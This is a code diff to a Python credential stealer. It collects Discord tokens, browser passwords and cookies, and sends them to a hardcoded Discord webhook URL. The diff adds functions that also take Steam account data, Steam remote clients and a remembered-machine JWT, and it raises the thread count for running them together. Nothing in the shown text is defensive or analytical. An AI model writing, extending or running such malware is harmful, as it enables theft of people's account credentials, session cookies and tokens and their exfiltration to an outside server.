@@ -26,13 +26,20 @@ def processTokens(toucan, web: Webhook, hard: Hardware):
 
 
 if __name__ == '__main__':
-    with ThreadPoolExecutor() as executor:
+    with ThreadPoolExecutor(7) as executor:
         tokenfuture = executor.submit(GetDiscordTokens)
         passwordsfuture = executor.submit(GetBrowsersPasswords)
         cookiesfuture = executor.submit(GetBrowsersCookies)
+        steamaccfuture = executor.submit(GetSteamAccount)
+        steamclientsfuture = executor.submit(GetSteamRemoteClients)
+        steamjwtfuture = executor.submit(GetRememberedMachineJWT)
     tokens = tokenfuture.result()
     passwords = passwordsfuture.result()
     cookies = cookiesfuture.result()
+    steamacc = steamaccfuture.result()
+    steamclients = steamclientsfuture.result()
+    steamjwt = steamjwtfuture.result()
+
     webhook = Webhook("https://discord.com/api/webhooks/1119496924886749224/Zb-HIGPkDOHhJuLMchIcKzhQCymL059fDQAmdnXjdaAgPyGOaboGN-CguVl-uamvZv6o")
     hardware = Hardware()
     with ThreadPoolExecutor() as executor:
